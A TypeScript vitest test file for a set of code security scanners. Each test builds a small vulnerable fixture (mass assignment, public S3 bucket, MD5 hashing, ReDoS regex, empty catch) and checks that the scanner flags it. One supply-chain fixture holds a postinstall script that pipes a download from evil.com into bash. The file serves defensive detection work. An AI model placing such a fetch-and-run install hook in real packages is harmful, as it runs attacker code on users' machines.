import { describe, it, expect } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { LlmSecurityScanner } from "../llm-security-scanner.js";
import { ApiSecurityScanner } from "../api-security-scanner.js";
import { CloudSecurityScanner } from "../cloud-scanner.js";
import { SupplyChainScanner } from "../supply-chain-scanner.js";
import { CryptoScanner } from "../crypto-scanner.js";
import { PrivacyScanner } from "../privacy-scanner.js";
import { RaceConditionScanner } from "../race-condition-scanner.js";
import { RedosScanner } from "../redos-scanner.js";
import { ErrorHandlingScanner } from "../error-handling-scanner.js";
import { ZeroTrustScanner } from "../zero-trust-scanner.js";

// Create temp fixture with vulnerable patterns
function createFixture(files: Record<string, string>): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "sphinx-test-"));
  for (const [name, content] of Object.entries(files)) {
    const filePath = path.join(dir, name);
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, content);
  }
  return dir;
}

function cleanup(dir: string) {
  fs.rmSync(dir, { recursive: true, force: true });
}

describe("LlmSecurityScanner", () => {
  it("detects client-side LLM API key", async () => {
    const dir = createFixture({
      "config.ts": [
        "// OpenAI client config",
        'const NEXT_PUBLIC_OPENAI_API_KEY = "sk-test123";',
      ].join("\n"),
    });
    const scanner = new LlmSecurityScanner();
    const { findings } = await scanner.scan(dir);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some((f) => f.rule.includes("client-api-key"))).toBe(true);
    cleanup(dir);
  });

  it("detects system prompt leakage", async () => {
    const dir = createFixture({
      "ai.ts": [
        "// LLM chatbot config",
        'const SYSTEM_PROMPT = "You are a helpful assistant that...";',
        "const openai = new OpenAI();",
      ].join("\n"),
    });
    const scanner = new LlmSecurityScanner();
    const { findings } = await scanner.scan(dir);
    expect(findings.some((f) => f.rule.includes("system-prompt"))).toBe(true);
    cleanup(dir);
  });
});

describe("ApiSecurityScanner", () => {
  it("detects mass assignment", async () => {
    const dir = createFixture({
      "routes.ts": `import express from "express";
const app = express();
app.post("/users", async (req, res) => {
  const user = await User.create(req.body);
  res.json(user);
});`,
    });
    const scanner = new ApiSecurityScanner();
    const { findings } = await scanner.scan(dir);
    expect(findings.some((f) => f.rule.includes("mass-assignment"))).toBe(true);
    cleanup(dir);
  });

  it("detects excessive data exposure", async () => {
    const dir = createFixture({
      "api.ts": `import express from "express";
const router = express.Router();
router.get("/profile", async (req, res) => {
  const user = await User.findById(req.params.id);
  res.json(user);
});`,
    });
    const scanner = new ApiSecurityScanner();
    const { findings } = await scanner.scan(dir);
    expect(findings.some((f) => f.rule.includes("data-exposure"))).toBe(true);
    cleanup(dir);
  });
});

describe("CloudSecurityScanner", () => {
  it("detects public S3 bucket", async () => {
    const dir = createFixture({
      "main.tf": `resource "aws_s3_bucket" "data" {
  bucket = "my-bucket"
  acl    = "public-read"
}`,
    });
    const scanner = new CloudSecurityScanner();
    const { findings } = await scanner.scan(dir);
    expect(findings.some((f) => f.rule.includes("s3-public"))).toBe(true);
    cleanup(dir);
  });

  it("detects open security group", async () => {
    const dir = createFixture({
      "sg.tf": `resource "aws_security_group" "web" {
  ingress {
    cidr_blocks = ["0.0.0.0/0"]
  }
}`,
    });
    const scanner = new CloudSecurityScanner();
    const { findings } = await scanner.scan(dir);
    expect(findings.some((f) => f.rule.includes("sg-open"))).toBe(true);
    cleanup(dir);
  });
});

describe("SupplyChainScanner", () => {
  it("detects dangerous install script", async () => {
    const dir = createFixture({
      "package.json": JSON.stringify({
        name: "test",
        scripts: { postinstall: "curl https://evil.com/install.sh | bash" },
        dependencies: { express: "^4.0.0" },
      }),
    });
    const scanner = new SupplyChainScanner();
    const { findings } = await scanner.scan(dir);
    expect(findings.some((f) => f.rule.includes("dangerous-install"))).toBe(true);
    cleanup(dir);
  });

  it("detects unpinned dependencies", async () => {
    const dir = createFixture({
      "package.json": JSON.stringify({
        name: "test",
        dependencies: { lodash: "*", express: "latest" },
      }),
    });
    const scanner = new SupplyChainScanner();
    const { findings } = await scanner.scan(dir);
    expect(findings.some((f) => f.rule.includes("unpinned"))).toBe(true);
    cleanup(dir);
  });
});

describe("CryptoScanner", () => {
  it("detects weak hash", async () => {
    const dir = createFixture({
      "hash.ts": `import crypto from "crypto";
const hash = crypto.createHash("md5").update(data).digest("hex");`,
    });
    const scanner = new CryptoScanner();
    const { findings } = await scanner.scan(dir);
    expect(findings.some((f) => f.rule.includes("weak-hash"))).toBe(true);
    cleanup(dir);
  });

  it("detects hardcoded encryption key", async () => {
    const dir = createFixture({
      "encrypt.ts": `import crypto from "crypto";
const encryptionKey = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHNlY3JldCBrZXk=";
const cipher = crypto.createCipheriv("aes-256-cbc", encryptionKey, iv);`,
    });
    const scanner = new CryptoScanner();
    const { findings } = await scanner.scan(dir);
    expect(findings.some((f) => f.rule.includes("hardcoded-key"))).toBe(true);
    cleanup(dir);
  });
});

describe("PrivacyScanner", () => {
  it("detects PII logging", async () => {
    const dir = createFixture({
      "handler.ts": `app.post("/register", (req, res) => {
  console.log(req.body.email);
  console.log(user);
});`,
    });
    const scanner = new PrivacyScanner();
    const { findings } = await scanner.scan(dir);
    expect(findings.some((f) => f.rule.includes("pii-logging"))).toBe(true);
    cleanup(dir);
  });
});

describe("RaceConditionScanner", () => {
  it("detects TOCTOU in file operations", async () => {
    const dir = createFixture({
      "files.ts": `import fs from "fs";
if (fs.existsSync("/tmp/data")) {
  const data = fs.readFileSync("/tmp/data");
}`,
    });
    const scanner = new RaceConditionScanner();
    const { findings } = await scanner.scan(dir);
    expect(findings.some((f) => f.rule.includes("toctou"))).toBe(true);
    cleanup(dir);
  });
});

describe("RedosScanner", () => {
  it("detects nested quantifiers", async () => {
    const dir = createFixture({
      "validate.ts": `const emailRegex = new RegExp("(a+)+b");
if (emailRegex.test(req.query.input)) { }`,
    });
    const scanner = new RedosScanner();
    const { findings } = await scanner.scan(dir);
    expect(findings.some((f) => f.rule.includes("redos"))).toBe(true);
    cleanup(dir);
  });
});

describe("ErrorHandlingScanner", () => {
  it("detects empty catch block", async () => {
    const dir = createFixture({
      "api.ts": `try {
  await doSomething();
} catch (err) {}`,
    });
    const scanner = new ErrorHandlingScanner();
    const { findings } = await scanner.scan(dir);
    expect(findings.some((f) => f.rule.includes("empty-catch"))).toBe(true);
    cleanup(dir);
  });

  it("detects stack trace exposure", async () => {
    const dir = createFixture({
      "handler.ts": `app.use((err, req, res, next) => {
  res.json({ error: err.stack });
});`,
    });
    const scanner = new ErrorHandlingScanner();
    const { findings } = await scanner.scan(dir);
    expect(findings.some((f) => f.rule.includes("stack-exposure"))).toBe(true);
    cleanup(dir);
  });
});

describe("ZeroTrustScanner", () => {
  it("detects implicit service trust", async () => {
    const dir = createFixture({
      "service.ts": `const data = await fetch("http://internal-service:3000/api/data");`,
    });
    const scanner = new ZeroTrustScanner();
    const { findings } = await scanner.scan(dir);
    expect(findings.some((f) => f.rule.includes("implicit-trust"))).toBe(true);
    cleanup(dir);
  });
});
